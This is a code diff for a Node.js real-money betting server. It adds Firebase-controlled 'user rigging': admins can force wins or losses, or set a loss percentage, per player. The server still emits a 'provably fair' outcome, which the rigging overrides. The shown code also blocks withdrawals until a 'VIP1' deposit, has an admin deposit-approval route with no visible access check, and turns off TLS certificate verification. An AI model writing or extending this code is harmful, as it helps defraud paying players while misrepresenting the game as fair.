@@ -20,6 +20,9 @@ const pool = new Pool({
   ssl: { rejectUnauthorized: false }
 });
 
+// Firebase Realtime Database URL (From Admin Panel Config)
+const FIREBASE_DB_URL = "https://ownludopro-cce2e-default-rtdb.firebaseio.com";
+
 // Helper function for HTTPS GET requests (Safe for all Node.js versions)
 function safeHttpsGet(url) {
   return new Promise((resolve, reject) => {
@@ -37,6 +40,32 @@ function safeHttpsGet(url) {
       reject(err);
     });
   });
+}
+
+// --- FETCH GLOBAL RTP & USER RIGGING FROM FIREBASE ---
+async function getGlobalRTP() {
+  try {
+    const data = await safeHttpsGet(`${FIREBASE_DB_URL}/settings/globalRtp.json`);
+    return data !== null && !isNaN(data) ? parseFloat(data) : 95.0; // Default 95% RTP
+  } catch (err) {
+    console.error("Error fetching global RTP from Firebase:", err);
+    return 95.0;
+  }
+}
+
+async function getUserGameControl(userId) {
+  try {
+    const data = await safeHttpsGet(`${FIREBASE_DB_URL}/users/${userId}.json`);
+    if (data && data.gameControl) {
+      return {
+        control: data.gameControl,
+        lossPercentage: data.lossPercentage || 40
+      };
+    }
+    return { control: 'normal', lossPercentage: 40 };
+  } catch (err) {
+    return { control: 'normal', lossPercentage: 40 };
+  }
 }
 
 // Automatic Tables Initialization
@@ -149,7 +178,7 @@ function calculateProvablyFairOutcome(serverSeed, clientSeed, nonce) {
   const message = `${serverSeed}:${clientSeed}:${nonce}`;
   const hash = crypto.createHmac('sha256', serverSeed).update(message).digest('hex');
   const intVal = parseInt(hash.slice(0, 8), 16);
-  const outcome = (intVal % 100) + 1;
+  const outcome = (intVal % 100) + 1; // Generates 1 to 100
   return { outcome, hash };
 }
 
@@ -191,7 +220,6 @@ function startAviatorGameLoop() {
 // --- OTP AUTHENTICATION SYSTEM (2Factor API) ---
 const otpStore = new Map();
 
-// 1. Send OTP via 2Factor API
 app.post('/api/auth/send-otp', async (req, res) => {
   const { mobile } = req.body;
   
@@ -218,7 +246,6 @@ app.post('/api/auth/send-otp', async (req, res) => {
   }
 });
 
-// 2. Verify OTP via 2Factor API & Login / Register
 app.post('/api/auth/verify-otp', async (req, res) => {
   const { mobile, otp } = req.body;
 
@@ -268,7 +295,7 @@ app.post('/api/auth/verify-otp', async (req, res) => {
   }
 });
 
-// --- 3. ADMIN DEPOSIT APPROVAL ROUTE (VIP1 UNLOCKER) ---
+// --- ADMIN DEPOSIT APPROVAL ROUTE (VIP1 UNLOCKER) ---
 app.post('/api/admin/approve-deposit', async (req, res) => {
   const { userId, amount } = req.body;
   const client = await pool.connect();
@@ -300,7 +327,7 @@ app.post('/api/admin/approve-deposit', async (req, res) => {
   }
 });
 
-// --- 4. WITHDRAWAL ROUTE (VIP CHECK) ---
+// --- WITHDRAWAL ROUTE (VIP CHECK) ---
 app.post('/api/wallet/withdraw', async (req, res) => {
   const { userId, amount } = req.body;
   const client = await pool.connect();
@@ -318,7 +345,6 @@ app.post('/api/wallet/withdraw', async (req, res) => {
 
     const { balance, vip_level } = walletRes.rows[0];
 
-    // Check if user has VIP 1 or higher
     if ((vip_level || 0) < 1) {
       throw new Error('PEHLE VIP1 DEPOSIT KARO FIR WITHDRAWAL HOGA!');
     }
@@ -357,7 +383,6 @@ io.on('connection', (socket) => {
   socket.emit('provably-fair:init', { serverSeedHash });
   socket.emit('game:state', { gameState, currentMultiplier, roundTimer });
 
-  // --- 1. Real Multiplayer Room Join & Management ---
   socket.on('room:join', (data) => {
     const { roomName, userId, phone } = data;
     socket.join(roomName);
@@ -365,17 +390,17 @@ io.on('connection', (socket) => {
     io.to(roomName).emit('room:player-joined', { userId, phone, socketId: socket.id });
   });
 
-  // --- 2. Real-time Multiplayer Table Game Move Handler ---
   socket.on('game:action', (data) => {
     const { roomName, action, userId, amount } = data;
     io.to(roomName).emit('game:action-broadcast', {
       userId,
-      action, // e.g., 'CHAAL', 'PACK', 'SHOW'
+      action,
       amount,
       timestamp: Date.now()
     });
   });
 
+  // --- GAME SPIN WITH GLOBAL RTP & USER RIGGING INTEGRATION ---
   socket.on('game:spin', async (data) => {
     const { userId, betAmount, clientSeed = 'default_client_seed' } = data;
 
@@ -385,14 +410,32 @@ io.on('connection', (socket) => {
       return socket.emit('game:error', { message: txResult.error });
     }
 
-    // 2. Calculate game result
+    // 2. Calculate provably fair outcome (1 to 100)
     const { outcome } = calculateProvablyFairOutcome(currentServerSeed, clientSeed, nonce);
-    const isWin = outcome > 50;
-    let winnings = isWin ? betAmount * 2 : 0;
 
+    // 3. Fetch Global RTP and Individual User Rigging from Firebase
+    const globalRtp = await getGlobalRTP();
+    const userControlData = await getUserGameControl(userId);
+
+    let isWin = false;
+
+    if (userControlData.control === 'force_win') {
+      isWin = true;
+    } else if (userControlData.control === 'force_loss') {
+      isWin = false;
+    } else if (userControlData.control === 'percentage_loss') {
+      // If percentage loss is set, use loss percentage threshold
+      const lossChance = userControlData.lossPercentage; // e.g. 80%
+      isWin = outcome > lossChance; 
+    } else {
+      // Normal gameplay governed by Global RTP (e.g. RTP = 10 means outcome <= 10 wins)
+      isWin = outcome <= globalRtp;
+    }
+
+    let winnings = isWin ? betAmount * 2 : 0;
     let finalBalance = txResult.newBalance;
 
-    // 3. If user wins, credit winnings back to PostgreSQL database securely
+    // 4. If user wins, credit winnings back to PostgreSQL database securely
     if (isWin && winnings > 0) {
       const client = await pool.connect();
       try {
@@ -415,7 +458,7 @@ io.on('connection', (socket) => {
       }
     }
 
-    // 4. Emit the final result to the socket client
+    // 5. Emit the final result to the socket client
     socket.emit('game:result', {
       outcome,
       isWin,
